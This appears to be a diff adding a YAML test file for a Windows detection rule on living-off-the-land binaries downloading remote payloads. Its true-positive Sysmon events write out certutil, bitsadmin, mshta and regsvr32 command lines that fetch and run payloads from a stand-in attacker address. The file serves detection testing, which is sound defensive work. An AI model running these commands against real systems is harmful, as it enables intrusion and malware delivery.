@@ -1,0 +1,88 @@
+# Behaviour tests for win_lolbin_remote_payload_download.yml
+
+rule: win_lolbin_remote_payload_download.yml
+
+true_positives:
+
+  - name: certutil urlcache fetching a payload from the attacker box
+    event:
+      EventID: 1
+      Channel: Microsoft-Windows-Sysmon/Operational
+      Computer: ws01.nexus.lab
+      Image: C:\Windows\System32\certutil.exe
+      CommandLine: certutil.exe -urlcache -split -f http://10.13.37.40/beacon.exe C:\Users\Public\svc.exe
+      ParentImage: C:\Windows\System32\cmd.exe
+      User: NEXUS\s.alqahtani
+
+  - name: bitsadmin transferring a remote file
+    event:
+      EventID: 1
+      Channel: Microsoft-Windows-Sysmon/Operational
+      Computer: ws01.nexus.lab
+      Image: C:\Windows\System32\bitsadmin.exe
+      CommandLine: bitsadmin.exe /transfer nexusjob /download /priority high http://10.13.37.40/a.dll C:\Users\Public\a.dll
+      ParentImage: C:\Windows\System32\cmd.exe
+      User: NEXUS\s.alqahtani
+
+  - name: mshta executing a remote HTA
+    event:
+      EventID: 1
+      Channel: Microsoft-Windows-Sysmon/Operational
+      Computer: ws01.nexus.lab
+      Image: C:\Windows\System32\mshta.exe
+      CommandLine: mshta.exe http://10.13.37.40/stage.hta
+      ParentImage: C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
+      User: NEXUS\a.alharbi
+
+  - name: regsvr32 Squiblydoo loading a remote scriptlet
+    event:
+      EventID: 1
+      Channel: Microsoft-Windows-Sysmon/Operational
+      Computer: ws01.nexus.lab
+      Image: C:\Windows\System32\regsvr32.exe
+      CommandLine: regsvr32.exe /s /u /i:https://10.13.37.40/pay.sct scrobj.dll
+      ParentImage: C:\Windows\System32\cmd.exe
+      User: NEXUS\f.alzahrani
+
+false_positives:
+
+  - name: certutil decoding a local file
+    # No URL, no -f fetch. Common admin usage.
+    event:
+      EventID: 1
+      Channel: Microsoft-Windows-Sysmon/Operational
+      Computer: ws01.nexus.lab
+      Image: C:\Windows\System32\certutil.exe
+      CommandLine: certutil.exe -decode C:\temp\cert.b64 C:\temp\cert.cer
+      ParentImage: C:\Windows\System32\cmd.exe
+      User: NEXUS\f.alzahrani
+
+  - name: Windows Update using BITS via svchost
+    event:
+      EventID: 1
+      Channel: Microsoft-Windows-Sysmon/Operational
+      Computer: ws01.nexus.lab
+      Image: C:\Windows\System32\bitsadmin.exe
+      CommandLine: bitsadmin.exe /transfer wuau /download http://dl.windowsupdate.com/c/msdownload/update/x.cab C:\Windows\SoftwareDistribution\x.cab
+      ParentImage: C:\Windows\System32\svchost.exe
+      User: NT AUTHORITY\SYSTEM
+
+  - name: regsvr32 registering a local DLL during install
+    event:
+      EventID: 1
+      Channel: Microsoft-Windows-Sysmon/Operational
+      Computer: ws01.nexus.lab
+      Image: C:\Windows\System32\regsvr32.exe
+      CommandLine: regsvr32.exe /s "C:\Program Files\NexusVPN\tap.dll"
+      ParentImage: C:\Windows\System32\msiexec.exe
+      User: NT AUTHORITY\SYSTEM
+
+  - name: mshta running a local HTA shipped with an application
+    event:
+      EventID: 1
+      Channel: Microsoft-Windows-Sysmon/Operational
+      Computer: ws01.nexus.lab
+      Image: C:\Windows\System32\mshta.exe
+      CommandLine: mshta.exe "C:\Program Files\NexusBackup\wizard.hta"
+      ParentImage: C:\Windows\explorer.exe
+      User: NEXUS\a.alharbi
